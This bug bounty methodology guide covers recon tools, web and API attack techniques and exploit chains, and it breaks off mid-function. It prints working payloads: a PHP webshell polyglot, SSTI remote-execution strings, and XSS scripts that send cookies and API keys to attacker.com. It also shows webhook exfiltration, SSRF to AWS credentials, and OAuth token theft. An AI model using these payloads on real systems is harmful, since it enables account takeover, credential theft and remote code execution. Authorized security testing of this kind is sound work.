# Bug Bounty Methodology and Vulnerability Research

## Table of Contents

1. [Bug Bounty Program Landscape](#1-bug-bounty-program-landscape)
2. [Reconnaissance Methodology](#2-reconnaissance-methodology)
3. [Web Application Attack Surface](#3-web-application-attack-surface)
4. [API Security Testing for Bounties](#4-api-security-testing-for-bounties)
5. [Advanced Exploitation Chains](#5-advanced-exploitation-chains)
6. [Mobile and Thick Client Testing](#6-mobile-and-thick-client-testing)
7. [Automation and Tooling](#7-automation-and-tooling)
8. [Report Writing for Maximum Impact](#8-report-writing-for-maximum-impact)
9. [Vulnerability Classes Deep Dive](#9-vulnerability-classes-deep-dive)
10. [Lab Exercises](#10-lab-exercises)

---

## 1. Bug Bounty Program Landscape

### 1.1 Platform Comparison

The major bug bounty platforms each cater to different segments of the market. Understanding their operational differences directly affects where to invest time.

| Platform | Programs | Triage | Payout Speed | Specialty |
|----------|----------|--------|--------------|-----------|
| HackerOne | 3000+ public | In-house + managed | 30-90 days | Largest program count, enterprise focus |
| Bugcrowd | 1500+ public | Crowd + managed | 30-60 days | Strong managed programs, CRT |
| Intigriti | 500+ public | In-house triage | 14-45 days | European companies, GDPR-aware scope |
| YesWeHack | 600+ public | In-house | 30-60 days | French/EU market, government programs |
| Synack | Private only | Elite vetted | Fast (managed) | Red team model, SRT membership required |

**HackerOne** dominates in volume. Their reputation system (Signal, Impact, Reputation score) gates access to private programs. Reports flow through a severity-based triage that often involves platform-employed triagers before reaching the program team. Payout varies wildly—from $50 for a low on a startup to $100K+ for critical RCE on major tech companies.

**Bugcrowd** differentiates with their Vulnerability Rating Taxonomy (VRT) which standardizes severity assessment. Their Crowdcontrol triage uses researchers as triagers, meaning faster initial response. Their CrowdStream offering provides continuous testing.

**Intigriti** is the European leader with strong GDPR alignment. Programs here often have EU-specific scope (data residency testing, cookie consent bypass). They offer a unique "bounty boost" system and community-driven events.

**YesWeHack** serves the French government and defense sector. They run a strong educational program (Dojo) and are the go-to platform for European sovereign bug bounty programs.

**Synack** operates differently—you apply to their Synack Red Team (SRT), pass skill assessments, and receive assignments. It's closer to freelance pentesting with bounty mechanics. Higher average payouts, but restricted access and NDA-heavy.

### 1.2 Program Types

**VDP vs Paid Bounty:**

A Vulnerability Disclosure Program (VDP) provides a legal channel to report bugs but offers no monetary reward—only recognition and safe harbor. Many companies start with a VDP before transitioning to paid bounty. VDPs still matter because:

- They represent low-competition targets (fewer hunters bother)
- Building rapport can lead to paid program invitations
- CVE assignments from VDP findings boost researcher credibility

Paid bounty programs define explicit payout ranges per severity:

```
Typical Payout Structure:
┌──────────────┬────────────────────────────┐
│ Severity     │ Range (varies by program)  │
├──────────────┼────────────────────────────┤
│ Critical     │ $5,000 – $100,000+         │
│ High         │ $2,000 – $25,000           │
│ Medium       │ $500 – $5,000              │
│ Low          │ $100 – $1,000              │
│ Informational│ $0 (swag/points only)      │
└──────────────┴────────────────────────────┘
```

**Public vs Private Programs:**

Public programs are visible to all registered researchers. Private programs are invitation-only, gated by reputation score, past performance, or platform invitation. Private programs typically offer:

- Higher payouts (less competition, higher trust)
- Broader scope (internal tools, pre-release features)
- Direct communication with security teams
- Faster triage and resolution

**Managed vs Self-Run:**

Managed programs delegate triage to the platform's team. Self-run programs handle everything internally. From a researcher perspective, managed programs mean faster initial triage but potentially less direct communication with the security team.

### 1.3 Scope Interpretation and Legal Safe Harbor

Scope defines what you can and cannot test. Misinterpreting scope is the fastest path to disqualification or legal trouble.

**Common Scope Indicators:**

```
IN SCOPE:
  *.example.com                    — All subdomains
  app.example.com/api/*            — API endpoints only
  Android app: com.example.app     — Specific package
  
OUT OF SCOPE:
  third-party integrations         — Stripe, AWS, etc.
  social engineering               — No phishing employees
  denial of service                — No load testing
  physical attacks                 — No office intrusion
  *.example-internal.com           — Employee tools
```

**Safe Harbor Clause:**

A proper safe harbor clause in program policy means the company agrees not to pursue legal action against researchers who:

1. Follow the program's rules of engagement
2. Report findings through the designated channel
3. Do not exfiltrate, modify, or destroy data
4. Do not access other users' data beyond minimum PoC
5. Allow reasonable time for remediation before disclosure

**Read the policy completely.** Some programs exclude specific vulnerability classes (e.g., "no self-XSS," "no theoretical attacks without PoC," "no scanner output without manual verification").

### 1.4 Payout Structures and Triage

**Triage Flow:**

```
Submission → Platform Triage → Program Review → Severity Assessment → Payout
     │              │                │                   │
     │         Needs More Info   Duplicate?          Dispute?
     │              │                │                   │
     └──── Update ──┘         N/A or Close          Mediation
```

**Factors That Increase Payouts:**

- Demonstrating real-world impact (not just theoretical)
- Providing working exploit code
- Showing how the bug affects multiple users or sensitive data
- Clean, professional report with video PoC
- Finding bugs in high-value assets (payment systems, auth, admin panels)

**Triage SLAs:**

Most platforms commit to initial response within 1-5 business days. However, in practice:
- HackerOne managed programs: 24-48 hour first response
- Self-run programs: up to 30 days for initial triage
- Resolution time: 30-90 days depending on severity

### 1.5 Building Reputation and Accessing Private Programs

**Reputation Building Strategy:**

1. Start with VDPs and low-competition public programs
2. Submit quality over quantity (high signal-to-noise ratio)
3. Focus on high-severity findings from day one
4. Maintain professionalism in all communications
5. Participate in platform CTFs and challenges
6. Attend live hacking events when invited

**Live Hacking Events (LHE):**

Platforms organize invitation-only events where top researchers gather to hack a specific target. These events offer:

- Bonus multipliers on payouts (often 2x-5x)
- Direct access to security teams
- Networking with top researchers
- Reputation boost from event participation

To get invited, you typically need:
- Top 100 ranking on the platform (or top in specific program)
- Consistent high-quality submissions over 6+ months
- Clean communication history (no policy violations)

---

## 2. Reconnaissance Methodology

### 2.1 Subdomain Enumeration

Subdomain enumeration is the foundation of bug bounty recon. Forgotten subdomains host deprecated applications, staging environments, and internal tools—all prime targets.

**Core Tools:**

```bash
# amass — most comprehensive passive + active enumeration
amass enum -passive -d target.com -o amass_passive.txt
amass enum -active -d target.com -brute -w /path/to/wordlist.txt -o amass_active.txt

# subfinder — fast passive enumeration using multiple sources
subfinder -d target.com -all -o subfinder.txt

# assetfinder — lightweight, good for quick runs
assetfinder --subs-only target.com > assetfinder.txt

# crt.sh — Certificate Transparency logs (direct query)
curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
  jq -r '.[].name_value' | sort -u > crtsh.txt

# SecurityTrails API (requires key)
curl -s "https://api.securitytrails.com/v1/domain/target.com/subdomains" \
  -H "APIKEY: $ST_KEY" | jq -r '.subdomains[]' | \
  sed "s/$/.target.com/" > sectrails.txt

# chaos — ProjectDiscovery's dataset of known subdomains
chaos -d target.com -o chaos.txt
```

**Combining Results:**

```bash
# Merge all sources and deduplicate
cat amass_passive.txt subfinder.txt assetfinder.txt crtsh.txt \
    sectrails.txt chaos.txt | sort -u > all_subs.txt

# Count unique subdomains found
wc -l all_subs.txt
```

### 2.2 DNS Resolution and Probing

Raw subdomain lists contain dead entries. Resolution filters to live hosts.

```bash
# puredns — resolve subdomains with wildcard filtering
puredns resolve all_subs.txt \
  -r resolvers.txt \
  --wildcard-tests 5 \
  -w resolved.txt

# massdns — fast bulk resolution
massdns -r resolvers.txt -t A -o S all_subs.txt | \
  awk '{print $1}' | sed 's/\.$//' | sort -u > massdns_resolved.txt

# dnsx — resolve and extract records
dnsx -l resolved.txt -a -cname -mx -resp -o dnsx_output.txt

# httpx — probe for live HTTP services
httpx -l resolved.txt \
  -ports 80,443,8080,8443,3000,8000,9090 \
  -title -tech-detect -status-code -content-length \
  -follow-redirects \
  -o live_hosts.txt
```

**Resolver List Maintenance:**

```bash
# Use dnsvalidator to build fresh resolver list
dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 100 -o resolvers.txt
```

### 2.3 Port Scanning at Scale

Beyond HTTP, services on non-standard ports reveal admin panels, databases, and debug interfaces.

```bash
# masscan — SYN scan entire port range (rate limit to avoid bans)
masscan -iL ip_list.txt -p1-65535 --rate 10000 \
  --open-only -oJ masscan_results.json

# nmap — targeted scan on masscan results for service detection
nmap -sV -sC -p $(cat masscan_ports.txt | tr '\n' ',') \
  -iL targets.txt -oA nmap_detailed

# Shodan CLI — query indexed services (no active scanning needed)
shodan search "ssl.cert.subject.cn:target.com" --fields ip_str,port,org
shodan search "hostname:target.com" --fields ip_str,port,product,version

# Censys CLI
censys search "services.tls.certificates.leaf.names: target.com" \
  --index-type hosts

# FOFA query (via API)
curl -s "https://fofa.info/api/v1/search/all?email=$FOFA_EMAIL&key=$FOFA_KEY&\
qbase64=$(echo -n 'domain=\"target.com\"' | base64)"
```

### 2.4 Content Discovery

Brute-forcing paths reveals hidden endpoints, admin panels, backup files, and configuration leaks.

```bash
# ffuf — fast web fuzzer
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -mc 200,301,302,403 \
  -fc 404 \
  -recursion -recursion-depth 2 \
  -rate 100 \
  -o ffuf_results.json

# feroxbuster — recursive content discovery with auto-filtering
feroxbuster -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  --depth 3 \
  --threads 50 \
  --auto-tune \
  --collect-words \
  --filter-status 404

# Backup and config file hunting
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common-backup-files.txt \
  -mc 200 \
  -fs 0

# Extension-based fuzzing for sensitive files
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
  -e .bak,.old,.swp,.sql,.zip,.tar.gz,.env,.config,.xml,.json,.yaml \
  -mc 200
```

**Wordlist Curation:**

The quality of content discovery depends entirely on wordlist quality. Recommended approach:

```bash
# Combine multiple wordlists
cat /usr/share/seclists/Discovery/Web-Content/raft-large-*.txt \
    /usr/share/seclists/Discovery/Web-Content/common.txt \
    custom_from_js_files.txt \
    wayback_paths.txt | sort -u > master_wordlist.txt

# Generate target-specific wordlist from their JS/HTML
cewl https://target.com -d 3 -m 5 -w target_words.txt
```

### 2.5 Technology Fingerprinting

Knowing the stack guides vulnerability selection and exploit development.

```bash
# Wappalyzer CLI (via webanalyze)
webanalyze -host https://target.com -crawl 2

# WhatWeb — detailed fingerprinting
whatweb -a 3 https://target.com --log-json whatweb.json

# nuclei tech-detect — template-based detection
nuclei -l live_hosts.txt -tags tech -o tech_results.txt

# httpx tech detection (built-in)
httpx -l resolved.txt -tech-detect -json -o tech.json
```

**What to Look For:**

| Technology | Attack Vectors |
|------------|---------------|
| WordPress | Plugin vulns, xmlrpc.php, wp-cron abuse |
| Spring Boot | Actuator endpoints, SpEL injection |
| Laravel | Debug mode (APP_DEBUG=true), .env exposure |
| Node/Express | Prototype pollution, SSRF via request libraries |
| Nginx | Misconfigurations, alias traversal |
| Apache Tomcat | Manager panel, PUT method, ghostcat |
| GraphQL | Introspection, batching, injection |
| AWS S3 | Bucket misconfiguration, presigned URL abuse |

### 2.6 JavaScript File Analysis

JS files are goldmines—they contain API keys, internal endpoints, commented-out debug routes, and business logic.

```bash
# Extract JS file URLs from live hosts
cat live_hosts.txt | httpx -silent | \
  hakrawler -js -depth 2 | grep "\.js$" | sort -u > js_files.txt

# LinkFinder — extract endpoints from JS
python3 linkfinder.py -i https://target.com/app.js -o cli

# Batch processing all JS files
while read url; do
  python3 linkfinder.py -i "$url" -o cli
done < js_files.txt | sort -u > js_endpoints.txt

# SecretFinder — extract API keys, tokens, credentials
python3 SecretFinder.py -i https://target.com/bundle.js -o cli

# RetireJS — find vulnerable JS libraries
retire --jspath /path/to/downloaded/js/ --outputformat json

# Manual regex patterns for secrets in JS
grep -rhoP "(api[_-]?key|token|secret|password|auth)['\"]?\s*[:=]\s*['\"][^'\"]{8,}['\"]" \
  downloaded_js/ | sort -u
```

### 2.7 GitHub Dorking and Source Code Recon

Organizations leak secrets, internal configurations, and proprietary code on GitHub regularly.

```bash
# gitleaks — scan repos for secrets
gitleaks detect --source /path/to/cloned/repo --report-format json \
  --report-path gitleaks_report.json

# truffleHog — entropy-based secret detection
trufflehog git https://github.com/target-org/repo --json

# Manual GitHub dork queries (use GitHub search or gh CLI)
# Search for secrets in org repos:
gh search code "api_key" --owner target-org --filename .env
gh search code "password" --owner target-org --filename config
gh search code "AWS_SECRET" --owner target-org
gh search code "BEGIN RSA PRIVATE KEY" --owner target-org

# Useful GitHub dork patterns:
# org:target-org filename:.env
# org:target-org "DB_PASSWORD"
# org:target-org extension:pem private
# org:target-org "smtp_password"
# org:target-org filename:wp-config.php
# org:target-org "AKIA" (AWS access key prefix)
```

**Employee Recon:**

```bash
# Find employee GitHub accounts
gh search users --org target-org --json login,name

# Check personal repos of employees for company secrets
# Employees often push company code to personal repos
```

### 2.8 Wayback Machine and Historical Data

Archived URLs reveal endpoints that may still be active but removed from the current site.

```bash
# gau (GetAllURLs) — fetch known URLs from multiple sources
gau target.com --threads 5 --o gau_urls.txt

# waybackurls — Wayback Machine specifically
echo "target.com" | waybackurls > wayback_urls.txt

# waymore — more comprehensive historical URL fetching
python3 waymore.py -i target.com -mode U -oU waymore_urls.txt

# Filter interesting endpoints from historical data
cat gau_urls.txt wayback_urls.txt | sort -u | \
  grep -iE "\.(php|asp|aspx|jsp|json|xml|yaml|sql|bak|old|zip|tar|gz|config)" \
  > interesting_historical.txt

# Extract parameters from historical URLs
cat gau_urls.txt | grep "?" | \
  unfurl --unique keys > historical_params.txt

# Find potentially vulnerable endpoints
cat gau_urls.txt | grep -iE "(redirect|url=|next=|return=|callback=|path=)" \
  > potential_open_redirects.txt

cat gau_urls.txt | grep -iE "(id=|user=|account=|file=|doc=|page=)" \
  > potential_idor.txt
```

---

## 3. Web Application Attack Surface

### 3.1 Parameter Discovery

Hidden and undocumented parameters frequently bypass security controls.

```bash
# Arjun — HTTP parameter discovery
arjun -u https://target.com/api/users -m GET POST \
  --include '{"Authorization": "Bearer TOKEN"}' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# x8 — optimized parameter discovery
x8 -u https://target.com/search -w params.txt \
  -m GET -H "Cookie: session=abc123"

# ParamSpider — mining parameters from web archives
python3 paramspider.py -d target.com --output paramspider_results.txt

# Combine discovered parameters with known endpoints
# Then test each parameter for injection points
```

### 3.2 Authentication Bypass Patterns

**JWT Flaws:**

```bash
# Decode JWT without verification
echo "eyJ0eXAiOiJKV..." | base64 -d 2>/dev/null | jq .

# Common JWT attacks:
# 1. Algorithm confusion (RS256 → HS256)
# 2. None algorithm
# 3. Key confusion (HMAC with RSA public key)
# 4. JWK header injection
# 5. kid parameter injection

# jwt_tool — automated JWT testing
python3 jwt_tool.py <JWT_TOKEN> -M at  # All tests
python3 jwt_tool.py <JWT_TOKEN> -X a   # Algorithm none attack
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem  # Key confusion
```

**OAuth Misconfiguration:**

```
Common OAuth Flaws:
1. redirect_uri validation bypass:
   - https://legit.com@evil.com
   - https://legit.com.evil.com  
   - https://legit.com/callback/../../evil
   - https://legit.com%0d%0a@evil.com

2. State parameter missing or predictable → CSRF
3. Token leakage via Referer header
4. Open redirect in redirect_uri → token theft
5. Scope escalation (request more permissions than granted)
6. PKCE downgrade (stripping code_challenge)
```

**SAML Issues:**

```
SAML Attack Vectors:
1. Signature wrapping — move signed assertion, inject malicious one
2. Signature exclusion — remove signature entirely
3. Certificate faking — self-signed cert with forged attributes
4. XXE via SAML XML parsing
5. Comment injection in NameID to bypass identity checks
6. Replay attacks — reusing valid assertions
```

### 3.3 Authorization Testing (IDOR, BOLA, Broken Function-Level Auth)

IDOR (Insecure Direct Object Reference) remains one of the most common and rewarding bug bounty findings.

**Methodology:**

```
1. Create two accounts (attacker and victim)
2. Perform all actions as victim, capture all requests
3. Identify object references: numeric IDs, UUIDs, filenames
4. Replace victim identifiers with attacker identifiers
5. Test both horizontal (same role) and vertical (different role) access
```

**Common IDOR Locations:**

```http
GET /api/users/12345/profile          — user ID in path
GET /api/documents?doc_id=67890       — document ID in query
POST /api/messages {"to": "user_id"}  — user ID in body
GET /api/invoices/INV-2024-001        — predictable reference
DELETE /api/comments/54321            — resource deletion
PATCH /api/orders/99999               — order modification
```

**Testing Techniques:**

```bash
# Burp Intruder — cycle through IDs
# Use Autorize extension for automated auth testing

# Manual testing pattern:
# 1. Log in as User A, note all object references
# 2. Log in as User B, attempt to access User A's objects
# 3. Try unauthenticated access (no session cookie)
# 4. Try with expired/invalid tokens
# 5. Test numeric ID iteration: /api/users/1 through /api/users/1000
# 6. Test UUID prediction (v1 UUIDs are time-based, sometimes predictable)

# Autorize Burp extension setup:
# - Set low-privilege cookie in "Authorization enforcement" tab
# - Browse application as admin
# - Autorize auto-replays each request with low-privilege token
# - Flag responses that should have been denied but weren't
```

### 3.4 Business Logic Flaws

Business logic bugs are platform-specific and cannot be found by automated scanners. They require understanding the application's intended workflow.

**Race Conditions:**

```python
# Race condition testing with Python threading
import threading
import requests

url = "https://target.com/api/redeem-coupon"
headers = {"Authorization": "Bearer TOKEN"}
data = {"coupon": "DISCOUNT50"}

def send_request():
    r = requests.post(url, headers=headers, json=data)
    print(f"Status: {r.status_code}, Response: {r.text[:100]}")

# Fire 50 concurrent requests
threads = [threading.Thread(target=send_request) for _ in range(50)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

**Price Manipulation:**

```
1. Add item to cart at normal price
2. Intercept checkout request
3. Modify price/quantity/currency fields:
   - Negative quantities → credit
   - Zero price → free items
   - Currency mismatch → conversion abuse
   - Integer overflow on quantity
   - Floating point precision abuse ($0.001 rounds to $0.00)
```

**Feature Abuse:**

```
Common business logic flaws:
- Referral bonus: self-referral via multiple accounts
- Free trial: email+tag trick (user+1@gmail.com)
- Coupon stacking: apply same code multiple times
- Cancellation flow: cancel after benefit received
- Export functionality: SSRF via "export to PDF" features
- Invitation system: invite self to higher-privilege role
```

### 3.5 File Upload Vulnerabilities

```bash
# Extension bypass techniques:
# .php.jpg           — double extension
# .php%00.jpg        — null byte (legacy)
# .pHp              — case variation
# .php5, .phtml     — alternative PHP extensions
# .asp;.jpg         — IIS semicolon trick
# ..;/shell.jsp     — Tomcat path traversal
# shell.php.       — trailing dot (Windows)
# shell.php::$DATA  — NTFS alternate data stream

# Content-Type bypass:
# Change Content-Type header to image/png while uploading .php

# Polyglot file creation (valid image + valid PHP):
# GIF89a header trick:
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

# Exiftool metadata injection:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg

# SVG XSS payload:
cat << 'EOF' > xss.svg
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100"/>
</svg>
EOF
```

### 3.6 SSRF Discovery and Exploitation

```bash
# Common SSRF injection points:
# - URL parameters: ?url=, ?redirect=, ?uri=, ?path=, ?src=
# - PDF/image generators
# - Webhook URLs
# - File import from URL
# - API integrations
# - HTML-to-PDF converters

# Basic SSRF testing:
# Replace URL parameter with:
# http://127.0.0.1:80
# http://localhost:22
# http://[::1]:80
# http://0x7f000001
# http://2130706433 (decimal IP)
# http://017700000001 (octal)
# http://169.254.169.254 (AWS metadata)

# Cloud metadata endpoints:
# AWS: http://169.254.169.254/latest/meta-data/
# GCP: http://metadata.google.internal/computeMetadata/v1/
# Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
# DigitalOcean: http://169.254.169.254/metadata/v1/

# SSRF bypass techniques:
# DNS rebinding: register domain that alternates between allowed IP and target
# URL encoding: http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
# Decimal IP: http://2130706433
# IPv6 mapping: http://[::ffff:127.0.0.1]
# URL shorteners
# Redirect chains: your-server.com redirects to internal IP
```

### 3.7 Template Injection (SSTI)

```bash
# Detection payloads (test in any user input reflected in page):
{{7*7}}           → 49 (Jinja2, Twig)
${7*7}            → 49 (FreeMarker, Velocity)
#{7*7}            → 49 (Thymeleaf)
<%= 7*7 %>        → 49 (ERB)
{{7*'7'}}         → 7777777 (Jinja2 confirmation)
${7*'7'}          → 49 or 7777777 (helps identify engine)

# Jinja2 (Python/Flask) exploitation:
{{config}}                                    # Leak config
{{request.application.__globals__}}           # Access globals
{{''.__class__.__mro__[1].__subclasses__()}}  # List all classes

# Full RCE payload for Jinja2:
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP) exploitation:
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}

# FreeMarker (Java):
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# Automated detection:
# Use tplmap:
python3 tplmap.py -u "https://target.com/page?name=test"
```

---

## 4. API Security Testing for Bounties

### 4.1 API Documentation Discovery

Undocumented or accidentally exposed API documentation reveals the entire attack surface.

```bash
# Common documentation endpoints:
/swagger.json
/swagger/v1/swagger.json
/api-docs
/api/docs
/openapi.json
/v1/api-docs
/v2/api-docs
/v3/api-docs
/.well-known/openapi.json
/docs
/redoc
/graphql (GraphQL Playground/GraphiQL)
/graphiql
/altair
/_catalog (Docker Registry)

# Fuzzing for API docs:
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-docs.txt \
  -mc 200

# GraphQL introspection query:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' | \
  jq .

# Full introspection for all queries, mutations, and types:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name kind ofType { name } } } type { name kind ofType { name } } } } } }"}' \
  > introspection_result.json
```

### 4.2 Mass Assignment and Parameter Pollution

```bash
# Mass assignment — sending extra parameters that map to internal model fields

# Example: User registration with role escalation
POST /api/register
{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "Str0ng!Pass",
  "role": "admin",           ← injected
  "isVerified": true,        ← injected
  "credits": 99999           ← injected
}

# HTTP Parameter Pollution (HPP):
# Duplicate parameters to bypass WAF or confuse parsers
GET /api/transfer?to=victim&amount=100&to=attacker
POST with: to=victim&to=attacker (last wins on some frameworks)

# Testing methodology:
# 1. Register normally, observe response fields
# 2. Identify writable vs read-only fields
# 3. Add read-only fields (role, balance, verified) to write requests
# 4. Check if the API accepts and applies them
```

### 4.3 Rate Limiting Bypass

```bash
# Common bypass techniques:

# 1. IP rotation headers (when behind reverse proxy):
X-Forwarded-For: 127.0.0.1
X-Real-IP: 10.0.0.1
X-Originating-IP: 192.168.1.1
X-Client-IP: 172.16.0.1
True-Client-IP: 1.2.3.4

# 2. Case manipulation on endpoints:
/api/login
/Api/Login
/API/LOGIN
/api/Login

# 3. Path variations:
/api/v1/login
/api/v1/login/
/api/v1//login
/api/v1/login?dummy=1
/api/v1/login#fragment

# 4. HTTP method switching:
# If POST is rate-limited, try PUT or PATCH

# 5. Adding null bytes or unicode:
/api/login%00
/api/login%0d%0a

# 6. JSON array batching (for GraphQL or APIs that support it):
[
  {"query": "mutation { login(email:\"a@b.com\", pass:\"try1\") { token } }"},
  {"query": "mutation { login(email:\"a@b.com\", pass:\"try2\") { token } }"},
  {"query": "mutation { login(email:\"a@b.com\", pass:\"try3\") { token } }"}
]
```

### 4.4 GraphQL-Specific Attacks

```bash
# Batching attack — send multiple operations in one request
POST /graphql
[
  {"query": "mutation { login(email:\"victim@target.com\", password:\"pass1\") { token } }"},
  {"query": "mutation { login(email:\"victim@target.com\", password:\"pass2\") { token } }"},
  {"query": "mutation { login(email:\"victim@target.com\", password:\"pass3\") { token } }"}
]
# Bypasses per-request rate limiting

# Deep/recursive query (DoS via resource exhaustion):
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}

# Field suggestion abuse (info disclosure even without introspection):
# Send invalid field names, API suggests valid ones:
{ user { invalidField } }
# Response: "Did you mean 'internalField', 'isAdmin'?"

# Alias-based batching to bypass query complexity limits:
{
  a1: user(id: 1) { email }
  a2: user(id: 2) { email }
  a3: user(id: 3) { email }
  # ... enumerate all users
}

# Mutation via GET (if allowed — bypasses CSRF protection):
GET /graphql?query=mutation{deleteAccount(id:123){success}}
```

### 4.5 REST API Authorization Flaws

```bash
# Broken Object Level Authorization (BOLA):
# Same as IDOR but API-specific terminology

# Testing pattern:
# 1. Authenticate as User A
# 2. List all User A's resources, note IDs
# 3. Authenticate as User B
# 4. Try accessing User A's resources with User B's token

# Example:
# As User A:
GET /api/v1/invoices/INV-001 → 200 OK (own invoice)

# As User B:
GET /api/v1/invoices/INV-001 → 200 OK? (BOLA vulnerability!)

# Broken Function Level Authorization:
# Admin endpoints accessible to regular users
GET /api/v1/admin/users       → should be 403, test if 200
POST /api/v1/admin/settings   → attempt admin operations
DELETE /api/v1/users/123      → regular user deleting others

# Test with modified roles:
# Decode JWT, change "role":"user" to "role":"admin"
# Re-encode (if using weak/no signature verification)
```

### 4.6 Webhook Exploitation

```bash
# Webhook SSRF — supply internal URLs as webhook endpoints:
POST /api/webhooks
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "events": ["payment.success"]
}

# Webhook data exfiltration — trigger events that send sensitive data to attacker:
POST /api/webhooks
{
  "url": "https://attacker-server.com/collect",
  "events": ["user.created", "payment.completed"]
}

# Webhook replay — capture webhook signatures, replay modified payloads
# If signature verification is weak or absent, forge webhook events

# Webhook timeout exploitation:
# Supply a slow-responding URL to tie up server resources:
{
  "url": "https://attacker.com/slow-response"  # Responds after 60 seconds
}
```

---

## 5. Advanced Exploitation Chains

### 5.1 Chaining Low-Severity Findings

Individual informational or low-severity findings can combine into critical impact. This is where creative thinking separates top researchers from scanners.

**Chain Philosophy:**

```
Low Finding A + Low Finding B + Medium Finding C = Critical Impact

Example chain:
1. Information disclosure (email enumeration via timing) → LOW
2. Weak password reset (predictable token) → MEDIUM
3. Missing rate limiting on reset endpoint → LOW
Combined: Full account takeover of any user → CRITICAL
```

**Common Successful Chains:**

```
Chain 1: Self-XSS → CSRF → Account Takeover
- Self-XSS alone: typically N/A or Low
- Find CSRF that forces victim to trigger the self-XSS context
- XSS payload steals session token → ATO

Chain 2: Info Disclosure → IDOR → Data Breach
- User enumeration endpoint leaks internal IDs
- IDOR on document endpoint using those IDs
- Mass download of private documents

Chain 3: Open Redirect → OAuth Token Theft
- Open redirect on authorized redirect_uri domain
- Craft OAuth flow that redirects token to attacker via the open redirect
- Attacker captures access_token from URL fragment
```

### 5.2 XSS to Account Takeover

```javascript
// Stored XSS payload that steals session:
<script>
fetch('https://attacker.com/steal?cookie='+document.cookie);
</script>

// XSS to change email (ATO without cookie theft):
<script>
fetch('/api/account/email', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json', 'X-CSRF-Token': getCsrfToken()},
  body: JSON.stringify({email: 'attacker@evil.com'}),
  credentials: 'include'
});
</script>

// XSS to add attacker's OAuth app:
<script>
fetch('/api/settings/authorized-apps', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({app_id: 'attacker-app', scope: 'full_access'}),
  credentials: 'include'
});
</script>

// XSS to create API key for persistence:
<script>
fetch('/api/settings/api-keys', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({name: 'integration', permissions: ['read', 'write']}),
  credentials: 'include'
}).then(r => r.json()).then(d => {
  fetch('https://attacker.com/key?k=' + d.api_key);
});
</script>
```

### 5.3 SSRF to Cloud Metadata to RCE

```bash
# Step 1: Find SSRF vector
# PDF generator, image fetch, webhook, URL preview

# Step 2: Access cloud metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 3: Retrieve IAM role credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role-Name
# Returns: AccessKeyId, SecretAccessKey, Token

# Step 4: Use credentials to access AWS services
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# List S3 buckets
aws s3 ls

# Check for Lambda functions (potential code execution)
aws lambda list-functions --region us-east-1

# Check EC2 instances (potential lateral movement)
aws ec2 describe-instances --region us-east-1

# Step 5: If Lambda access exists → RCE via function update
aws lambda update-function-code --function-name target-func \
  --zip-file fileb://payload.zip
```

### 5.4 Open Redirect to OAuth Token Theft

```
Attack Flow:

1. Identify open redirect: https://target.com/redirect?url=https://evil.com
   (Many programs mark open redirect as Low/Informational)

2. Craft OAuth authorization URL:
   https://target.com/oauth/authorize?
     client_id=legitimate-app&
     redirect_uri=https://target.com/redirect?url=https://evil.com/steal&
     response_type=token&
     scope=read+write

3. Victim clicks crafted link
4. Authenticates (or is already authenticated)
5. OAuth redirects to: https://target.com/redirect?url=https://evil.com/steal
6. Open redirect forwards to: https://evil.com/steal#access_token=VICTIM_TOKEN
7. Attacker's server captures the access token from URL fragment

Impact: Open Redirect (Low) + OAuth Flow = Account Takeover (Critical)
```

### 5.5 Race Condition Exploitation

```python
# Turbo Intruder script for Burp Suite (Jython):
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=True)
    
    # Queue the same request 100 times simultaneously
    for i in range(100):
        engine.queue(target.req, target.baseInput)

def handleResponse(req, interesting):
    table.add(req)

# Common race condition targets:
# - Coupon/voucher redemption
# - Money transfers (double-spend)
# - Like/vote systems
# - Following/unfollowing
# - File operations (TOCTOU)
# - Invitation acceptance
# - One-time token usage (password reset, email verify)
```

**Single-Packet Attack (HTTP/2):**

```python
# Using h2 library for single-packet race condition
# All requests arrive in a single TCP packet, eliminating network jitter

import h2.connection
import h2.events
import socket
import ssl

def single_packet_attack(host, requests):
    """Send multiple HTTP/2 requests in a single TCP packet."""
    ctx = ssl.create_default_context()
